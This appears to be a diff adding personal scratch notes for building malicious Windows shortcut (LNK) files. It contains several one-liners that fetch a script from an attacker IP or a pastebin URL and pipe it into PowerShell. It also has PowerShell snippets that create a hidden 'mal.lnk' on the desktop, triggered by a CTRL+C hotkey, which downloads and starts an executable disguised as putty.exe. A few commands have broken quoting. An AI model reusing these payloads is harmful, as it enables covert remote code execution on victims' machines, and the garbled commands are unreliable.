@@ -1,0 +1,57 @@
+work LNK :
+C:\Windows\System32\cmd.exe /c powershell.exe  ""(Invoke-WebRequest ""http://192.168.1.109/mal.txt"").Content | powershell""
+
+
+C:\Windows\System32\cmd.exe /c powershell.exe  ""(Invoke-WebRequest ""https://pastebin.com/raw/0Ndds629"").Content | powershell""
+----------------------------------------------------------------                                                                         
+$malLoc = $home + "\Desktop\mal.lnk"
+$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut($malLoc)
+$Shortcut.TargetPath = 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe'
+$Shortcut.Arguments = '/c powershell.exe -Uri 'http://192.168.1.109/putty.exe' -OutFile %tmp%\\file.exe; start %tmp%//file.exe'
+$Shortcut.hotkey = 'CTRL+C'
+$Shortcut.WindowStyle = 7
+$Shortcut.Save()
+attrib +h $malLoc
+
+
+----------------------------------------------------------------
+$malLoc = $home + "\Desktop\mal.lnk"
+$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut($malLoc)
+$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+$Shortcut.Arguments = "-Command `"& 'powershell.exe Invoke-webRequest -Uri 'http://192.168.1.109/putty.exe' -OutFile %tmp%\\file.exe; start %tmp%//file.exe'`""
+$Shortcut.hotkey = 'CTRL+C'
+$Shortcut.WindowStyle = 7
+$Shortcut.Save()
+attrib +h $malLoc
+
+
+-----------------------------------------------
+
+
+-------------------------------------------------
+
+Edit ;) I think this is what you want :
+
+$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("C:\Program Files\Test\test.lnk")
+$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+$Shortcut.Arguments = "-Command `"& 'C:\Program Files\Test\script.ps1'`""
+$Shortcut.WorkingDirectory = "C:\Program Files\Test\tool"
+$Shortcut.Save()
+as this is a script and not commands, you can also prefer
+
+$Shortcut.Arguments = "-File 'C:\Program Files\Test\script.ps1'"
+
+-------------------------------------------------
+powershell.exe Invoke-webRequest -Uri 'http://192.168.1.109/putty.exe' -OutFile %tmp%\\file.exe; start %tmp%//file.exe
+
+
+---------------------------------
+
+C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-webRequest -Uri 'http://192.168.1.109/putty.exe' -OutFile $env:temp'\file.exe; start $env:temp\file.exe
+
+
+
+C:\Windows\System32\cmd.exe \k powershell -w Hidden powershell -command (Invoke-webrequest -URI "http://192.168.1.109/mal.txt" -UseBasicParsing).content
